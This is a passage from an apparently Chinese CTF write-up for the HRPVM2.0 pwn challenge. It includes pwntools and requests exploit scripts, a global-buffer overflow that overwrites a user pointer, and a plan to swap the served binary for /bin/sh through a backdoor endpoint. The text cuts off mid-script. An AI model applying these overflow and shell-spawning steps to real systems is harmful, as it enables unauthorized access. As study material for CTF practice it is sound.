<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#elf = ELF(challenge)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;2222&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1409)\nb *$rebase(0x137A)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x2000</span>):</span><br><span class="line">        sl(<span class="string">&quot;Login&quot;</span>)</span><br><span class="line">        sl(<span class="string">&quot;\x00&quot;</span>*<span class="number">6</span>)</span><br><span class="line">        sl(<span class="string">&quot;\x00&quot;</span>*<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x2000</span>):</span><br><span class="line">        sl(<span class="string">&quot;Safe_Mode_Key&quot;</span>)</span><br><span class="line"></span><br><span class="line">t1 = Thread(target=login())</span><br><span class="line">t2 = Thread(target=get_flag())</span><br><span class="line"></span><br><span class="line">t1.start()</span><br><span class="line">t2.start()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="HRPVM2-0"><a href="#HRPVM2-0" class="headerlink" title="HRPVM2.0"></a>HRPVM2.0</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kernel: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">08</span>cd1082abae94aa4bc1d29a144b1a27bb3e875f, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p>该题目是一个 Web 服务器，启动 Apache 服务器的代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, jsonify</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全局变量，用于存储子进程和线程</span></span><br><span class="line">process = <span class="literal">None</span></span><br><span class="line">output = queue.Queue()</span><br><span class="line">error = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_program</span>():</span></span><br><span class="line">    <span class="keyword">global</span> process, output, error</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 启动 AMD64 ELF 程序</span></span><br><span class="line">    process = subprocess.Popen([<span class="string">&#x27;./templates/kernel&#x27;</span>], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 持续读取子进程的输出</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        line = process.stdout.readline()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        output.put(line)</span><br><span class="line">        process.stdout.flush()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读取子进程的错误输出</span></span><br><span class="line">    error = process.stderr.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">global</span> process, output, error</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> process <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> process.poll() <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># 如果还没有启动 AMD64 ELF 程序，或者子进程已经结束，则启动一个新的线程</span></span><br><span class="line">        process = <span class="literal">None</span></span><br><span class="line">        output = queue.Queue()</span><br><span class="line">        error = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        thread = Thread(target=run_program)</span><br><span class="line">        thread.start()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 渲染 HTML 模板</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/send&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span>():</span></span><br><span class="line">    <span class="keyword">global</span> process</span><br><span class="line"></span><br><span class="line">    command = request.form.get(<span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 向子进程发送命令</span></span><br><span class="line">    process.stdin.write(command + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    process.stdin.flush()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(status=<span class="string">&quot;success&quot;</span>), <span class="number">200</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/receive&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">receive</span>():</span></span><br><span class="line">    <span class="keyword">global</span> output, error</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> output.empty():</span><br><span class="line">        current_output = output.get()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        current_output = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(output=current_output, error=error)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test_system_exec&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_system_exec</span>():</span></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    os.system(<span class="string">&quot;chmod +x /bin/shell &amp;&amp; /bin/shell&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(status=<span class="string">&quot;success&quot;</span>), <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>使用 docker 搭建环境后通过 <a target="_blank" rel="noopener" href="http://172.26.0.2:5000/">http://172.26.0.2:5000/</a> 即可访问题目页面，类似于一个网页版的 shell</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; cat README</span><br><span class="line">~/@HRP$ Perhaps you think <span class="keyword">this</span> question is very similar to HRPVM, but it is a bit different. The author of the question is quite awkward <span class="keyword">and</span> went to work on the web. Let<span class="number">&#x27;</span>s play with the entire check-in question <span class="keyword">for</span> everyone</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<p>全局变量溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( file-&gt;fd &gt;= <span class="number">0</span> )                      <span class="comment">// read</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( user-&gt;key || file-&gt;r )</span><br><span class="line">    &#123;</span><br><span class="line">        len = atoi(rdxg);</span><br><span class="line">        copy_data(read_buf, file-&gt;data, len);</span><br><span class="line">        len = atoi(rdxg);</span><br><span class="line">        clear(<span class="string">&quot;[+] Read %d bytes from file: %s\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)len, read_buf);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>通过溢出 read_buf 可以覆盖 user：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.bss:<span class="number">0000000000005040</span> ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+read_buf db <span class="number">100</span><span class="function">h <span class="title">dup</span><span class="params">(?)</span>                 </span>; DATA XREF: syscall+<span class="number">12</span>E↑o</span><br><span class="line">.bss:<span class="number">0000000000005140</span>                               ; User *user</span><br><span class="line">.bss:<span class="number">0000000000005140</span> ?? ?? ?? ?? ?? ?? ?? ??       user dq ?  </span><br></pre></td></tr></table></figure>
<p>程序提供了后门，可以执行 <code>/bin/shell</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test_system_exec&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_system_exec</span>():</span></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    os.system(<span class="string">&quot;chmod +x /bin/shell &amp;&amp; /bin/shell&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(status=<span class="string">&quot;success&quot;</span>), <span class="number">200</span></span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>想要获取 flag 则需要绕过两个点：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( user-&gt;key || !<span class="built_in">strcmp</span>(file-&gt;perm, user-&gt;name) )</span><br><span class="line">  <span class="built_in">puts</span>(file-&gt;data);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[-] Permission denied!&quot;</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li><code>user-&gt;key == 1</code></li>
<li><code>user-&gt;name == root</code></li>
</ul>
<p>理论上可以通过 read_buf 的溢出来覆盖 user（我们可以通过单独执行二进制文件来进行调试）</p>
<p>首先看单独执行二进制文件时，打通的 payload：（概率 1/16）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sl(<span class="string">&quot;root&quot;</span>)</span><br><span class="line">data = <span class="string">&quot;echo &quot;</span>+<span class="string">&quot;a&quot;</span>*<span class="number">0x100</span>+p16(<span class="number">0xd1e0</span>)+<span class="string">&quot;&gt;payload&quot;</span></span><br><span class="line">sla(<span class="string">&quot;$&quot;</span>,data)</span><br><span class="line">data = <span class="string">&quot;echo mov rdi,payload;syscall 0;echo mov rdi,payload;mov rdx,260;syscall 1;&gt;exp&quot;</span></span><br><span class="line">sla(<span class="string">&quot;$&quot;</span>,data)</span><br><span class="line">data = <span class="string">&quot;exec exp&quot;</span></span><br><span class="line">sla(<span class="string">&quot;$&quot;</span>,data)</span><br><span class="line">data = <span class="string">&quot;cat flag&quot;</span></span><br><span class="line">sla(<span class="string">&quot;$&quot;</span>,data)</span><br></pre></td></tr></table></figure>
<p>但是打网页时 0xd1e0 会被转义，因此我们需要找寻可见字符的地址：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&quot;http://172.26.0.2:5000/send&quot;</span></span><br><span class="line"></span><br><span class="line">res = requests.get(<span class="string">&quot;http://172.26.0.2:5000&quot;</span>)</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;&#123;&#x27;input&#x27;:&quot;</span>+<span class="string">&quot;a&quot;</span>*<span class="number">0x80</span>+<span class="string">&quot;&#x27;root&#x27;&#125;&quot;</span></span><br><span class="line">res = requests.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;&#123;&#x27;input&#x27;:&#x27;echo &quot;</span>+<span class="string">&quot;a&quot;</span>*<span class="number">0x100</span>+<span class="string">&quot;02&quot;</span>+<span class="string">&quot;&gt;payload&#x27;&#125;&quot;</span></span><br><span class="line">res = requests.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;&#123;&#x27;input&#x27;:&#x27;echo mov rdi,payload;syscall 0;echo mov rdi,payload;mov rdx,260;syscall 1;&gt;exp&#x27;&#125;&quot;</span></span><br><span class="line">res = requests.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;&#123;&#x27;input&#x27;:&#x27;exec exp&#x27;&#125;&quot;</span></span><br><span class="line">res = requests.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;&#123;&#x27;input&#x27;:&#x27;cat flag&#x27;&#125;&quot;</span></span><br><span class="line">res = requests.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    res = requests.get(<span class="string">&quot;http://172.26.0.2:5000/receive&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>
<p>不过这个题目还没有结束，看别人 wp 时才发现服务器上那个是假 flag，需要拿到 shell 才能拿到真 flag</p>
<p>看别人 wp 时学到了一种比较方便的交互方式：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    req = requests.session()</span><br><span class="line">    url = <span class="string">&quot;http://172.26.0.2:5000&quot;</span></span><br><span class="line">    req.get(url)</span><br><span class="line">    p = tube()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">io_recv_raw</span>(<span class="params">*a</span>):</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    r = req.get(url + <span class="string">&quot;/receive&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.json())</span><br><span class="line">    <span class="keyword">return</span> r.json().get(<span class="string">&#x27;output&#x27;</span>, <span class="string">&quot;&quot;</span>).encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">io_send_raw</span>(<span class="params">x</span>):</span></span><br><span class="line">    r = req.post(url + <span class="string">&quot;/send&quot;</span>, data=&#123;<span class="string">&quot;input&quot;</span>: x&#125;)</span><br><span class="line">    </span><br><span class="line">p.recv_raw = io_recv_raw</span><br><span class="line">p.send_raw = io_send_raw</span><br></pre></td></tr></table></figure>
<ul>
<li><code>tube</code>：生成一个新过程，并用管子包裹它以进行通信（将其设置为网络 IO 即可快速进行交互）</li>
</ul>
<p>程序还有一个后门可以执行内存上的 <code>/bin/shell</code> 文件，而 mount 命令可以往 <code>/bin/shell</code> 中写入数据（同样需要满足 <code>user-&gt;key == 1</code>）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( getnum_by_name(name) == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">strcat</span>(dest, name);</span><br><span class="line">    fd = fopen(dest, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( fd )</span><br><span class="line">    &#123;</span><br><span class="line">        len = <span class="built_in">strlen</span>(file-&gt;data);</span><br><span class="line">        fwrite(file-&gt;data, <span class="number">1uLL</span>, len, fd);</span><br><span class="line">        fclose(fd);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Device mounted&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Unable to open physical device.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以在文件启动脚本中看到如下的代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动 AMD64 ELF 程序</span></span><br><span class="line">process = subprocess.Popen([<span class="string">&#x27;./templates/kernel&#x27;</span>], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>执行如下的 shell 脚本就可以替换二进制文件 kernel 为真实的 <code>/bin/sh</code> 文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">cp /bin/sh /app/templates/kernel</span><br></pre></td></tr></table></figure>
<p>于是利用的主要步骤如下：</p>
<ul>
<li>利用程序的溢出修改 <code>user</code>，使其指向我们可以控制的 chunk（概率为 1/16）</li>
<li>利用程序功能创建 <code>/bin/shell</code>，并使用 exec 往其中写入上述的 shell 脚本</li>
<li>通过 mount 功能将 <code>/bin/shell</code> 中的脚本写入真实的 <code>/bin/shell</code> 文件</li>
<li>通过后门 <code>/test_system_exec</code> 执行 <code>/bin/shell</code> 完成替换</li>
<li>再次连接即可拿到 <code>/bin/sh</code></li>
</ul>
<p>PS：第一次在本地进行调试时遇到 <code>/bin</code> 目录没有权限的问题，而 docker 中的权限是 root，没有这个问题</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./kernel1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = 